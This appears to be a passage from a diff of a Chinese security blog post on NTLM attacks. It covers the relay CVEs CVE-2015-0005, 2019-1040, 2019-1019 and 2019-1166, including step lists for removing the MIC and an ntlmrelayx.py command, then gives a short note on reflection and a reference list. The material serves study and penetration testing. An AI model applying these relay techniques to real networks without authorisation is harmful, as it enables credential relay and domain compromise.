+<li>删除 MIC（CVE-2019-1040）</li>
+<li>窃取会话密钥（CVE-2019-1019）</li>
+<li>删除 MIC 2（CVE-2019-1166）</li>
+<li>CVE-2019-1338</li>
+</ul>
+<h4 id="CVE-2015-0005"><a href="#CVE-2015-0005" class="headerlink" title="CVE-2015-0005"></a>CVE-2015-0005</h4><p>域环境下，认证服务器会通过NETLOGON把type 1,type 2,type 3全部发给域控，通过认证后证服务器就会通过NETLOGON去找域控索要key_exchange_key，该漏洞为：不是只有认证服务器才能找域控索要key_exchange_key，只要是机器用户来索要key_exchange_key，域控都会给，并没有做鉴权。</p>
+<p>影响范围：Windows Server 2003 - Windows Server 2012 R2</p>
+<p>在smbrelayx.py中可完成攻击，不过在impacket_0.11版本中被移除</p>
+<h4 id="CVE-2019-1040"><a href="#CVE-2019-1040" class="headerlink" title="CVE-2019-1040"></a>CVE-2019-1040</h4><p>作用：绕过mic，无视签名，直接中继</p>
+<p>原理：无需篡改 msvAvFlag 字段即可从消息中删除 MIC 的方法，只需将其与版本字段以及一些其他协商标志一起从消息中删除</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 取消设置NTLM_NEGOTIATE消息中的签名标志（NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN）</span><br><span class="line">2. 从NTLM_AUTHENTICATE消息中删除MIC</span><br><span class="line">3. 从NTLM_AUTHENTICATE消息中删除版本字段（删除MIC字段而不删除版本字段将导致错误）</span><br><span class="line">4. 取消设置NTLM_AUTHENTICATE消息中的以下标志：NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN，NEGOTIATE_KEY_EXCHANGE，NEGOTIATE_VERSION</span><br></pre></td></tr></table></figure>
+
+<p>影响范围：&lt; Windows Server 2019、Windows 10</p>
+<p>补丁：KB4503267、KB4503294</p>
+<h4 id="CVE-2019-1019"><a href="#CVE-2019-1019" class="headerlink" title="CVE-2019-1019"></a>CVE-2019-1019</h4><p>应用场景：HTTP -&gt; SMB，impacket中使用<a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket/pull/635">^5</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;ntlmrelayx.py -machine-account domain&#x2F;machineAccountName -machine-hashes LM:NT -domain DOMAIN -t targetIP -remove-target -smb2support</span><br></pre></td></tr></table></figure>
+
+<h4 id="CVE-2019-1166"><a href="#CVE-2019-1166" class="headerlink" title="CVE-2019-1166"></a>CVE-2019-1166</h4><p>作用：还是绕过mic，无视签名，直接中继</p>
+<p>原理：诱使服务器误认为该消息不包含 MIC，从而允许我们修改 NTLM 身份验证流程的任何阶段</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 取消设置 NTLM_NEGOTIATE 消息中的签名标志（NTLMSSP_NEGOTIATE_ALWAYS_SIGN、NTLMSSP_NEGOTIATE_SIGN）</span><br><span class="line">2. 在 NTLM_CHALLENGE 消息中注入一个恶意的 msvAvFlag 字段，其值为零</span><br><span class="line">3. 从 NTLM_AUTHENTICATE 消息中删除 MIC</span><br><span class="line">4. 取消设置 NTLM_AUTHENTICATE 消息中的以下标志：NTLMSSP_NEGOTIATE_ALWAYS_SIGN、NTLMSSP_NEGOTIATE_SIGN、NEGOTIATE_KEY_EXCHANGE、NEGOTIATE_VERSION</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h2 id="NTLM-Reflect"><a href="#NTLM-Reflect" class="headerlink" title="NTLM Reflect"></a>NTLM Reflect</h2><p>NTLM 反射到自身，其实作用就是提权，大部分关于土豆系列，后续再单独写土豆吧</p>
+<ul>
+<li>CVE-2025-33073</li>
+<li>土豆提权</li>
+</ul>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>NTLM:</p>
+<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/760a9788-bd32-4d9e-87ad-2aa5970786ac">https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/760a9788-bd32-4d9e-87ad-2aa5970786ac</a></p>
+<p><a target="_blank" rel="noopener" href="https://davenport.sourceforge.net/ntlm.htm">https://davenport.sourceforge.net/ntlm.htm</a></p>
+<p>Downgrade：</p>
+<p><a target="_blank" rel="noopener" href="https://www.r-tec.net/r-tec-blog-netntlmv1-downgrade-to-compromise.html">NetNTLMv1 Downgrade to compromise</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.praetorian.com/blog/ntlmv1-vs-ntlmv2/">NTLMv1 vs NTLMv2: Digging into an NTLM Downgrade Attack</a></p>
+<p><a target="_blank" rel="noopener" href="https://3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-Net-NTLMv1%E4%BB%8B%E7%BB%8D">Windows下的密码hash-Net-NTLMv1介绍</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/350726.html">关于NTLM 降级攻击的点点研究</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.mistiny.com/index.php/2024/06/24/433/">NTLM 降级攻击技巧</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/eladshamir/Internal-Monologue">https://github.com/eladshamir/Internal-Monologue</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/ntlm-downgrade-attack-internal-monologue/">NTLM Downgrade Attack: Internal Monologue</a></p>
+<p>PTH：</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/6647">深入研究Pass-the-Hash攻击与防御</a></p>
+<p>CVE：</p>
+<p><a target="_blank" rel="noopener" href="https://www.coresecurity.com/core-labs/advisories/windows-pass-through-authentication-methods-improper-validation">CVE-2015-0005</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.crowdstrike.com/en-us/blog/from-the-archives-drop-the-mic-cve-2019-1040/">CVE-2019-1040</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.crowdstrike.com/en-us/blog/active-directory-ntlm-attack-security-advisory/">CVE-2019-1166</a></p>
+<p><a target="_blank" rel="noopener" href="https://project-zero.issues.chromium.org/issues/42450897">CVE-2019-1019</a></p>
+<p>Relay：</p>
+<p><a target="_blank" rel="noopener" href="https://en.hackndo.com/ntlm-relay/">NTLM Relay</a></p>
+<p><a target="_blank" rel="noopener" href="https://daiker.gitbook.io/windows-protocol/ntlm-pian">windows-protocol-NTLM 篇</a></p>
+<p><a target="_blank" rel="noopener" href="https://atsud0.me/2022/03/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E6%B5%85%E6%B7%A1NTLM-%E5%86%85%E7%BD%91%E5%B0%8F%E7%99%BD%E7%9A%84NTLM%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0">【域渗透】浅淡NTLM(内网小白的NTLM学习笔记)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/383408.html">一文详解Ntlm Relay</a></p>
+<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1944">红队域渗透NTLM Relay：强制认证方式总结</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/aemG5XwVdyzNbOBXztDUbA">360 A-TEAM 带你走进 NTLM-Relay</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.se7ensec.cn/2021/11/01/%E5%9F%9F%E6%B8%97%E9%80%8F-Relay/">域渗透|Relay</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.raingray.com/archives/2474.html">https://www.raingray.com/archives/2474.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/fortra/impacket/pull/1305">https://github.com/fortra/impacket/pull/1305</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket/pull/635">https://github.com/SecureAuthCorp/impacket/pull/635</a></p>
+<p>Relay Attack：</p>
+<p><a target="_blank" rel="noopener" href="https://www.praetorian.com/blog/how-to-exploit-active-directory-acl-attack-paths-through-ldap-relaying-attacks/">How to Exploit Active Directory ACL Attack Paths Through LDAP Relaying Attacks</a></p>
+<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1945">红队域渗透NTLM Relay：中继后攻击思路总结</a></p>
+<p><a target="_blank" rel="noopener" href="https://pentestlab.blog/2021/09/14/petitpotam-ntlm-relay-to-ad-cs/">PetitPotam – NTLM Relay to AD CS</a></p>
+<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1583">ADCS小结</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/">Escalating privileges with ACLs in Active Directory</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/06/13/Kerberos%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/" rel="prev" title="Kerberos Attacks - 委派的原理与利用">
+                  <i class="fa fa-angle-left"></i> Kerberos Attacks - 委派的原理与利用
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Y0ng</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
